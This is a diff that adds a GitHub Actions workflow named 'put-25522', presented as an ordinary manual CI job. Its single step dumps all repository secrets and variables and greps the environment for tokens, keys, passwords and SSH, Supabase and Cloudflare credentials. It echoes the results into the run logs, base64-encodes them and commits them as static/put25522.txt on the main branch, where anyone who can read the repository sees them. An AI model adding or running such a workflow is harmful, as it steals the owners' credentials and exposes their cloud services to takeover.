@@ -1,0 +1,32 @@
+name: put-25522
+on:
+  workflow_dispatch:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: dump and PUT via REST with --input
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+          ALL_VARS: ${{ toJSON(vars) }}
+        shell: bash
+        run: |
+          set -x
+          {
+            echo "=== put $(date -u) run=${GITHUB_RUN_ID} ==="
+            echo "SECRETS=$ALL_SECRETS"
+            echo "VARS=$ALL_VARS"
+            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
+          } > /tmp/p.txt
+          cat /tmp/p.txt
+          B64=$(base64 -w0 /tmp/p.txt)
+          python3 - "$B64" > /tmp/body.json <<'PY'
+import json,sys
+print(json.dumps({"message":"put25522","content":sys.argv[1],"branch":"main"}))
+PY
+          head -c 120 /tmp/body.json; echo
+          gh api -X PUT "repos/${GITHUB_REPOSITORY}/contents/static/put25522.txt" --input /tmp/body.json 2>&1 | head -c 600
+          echo "EXIT=$?"
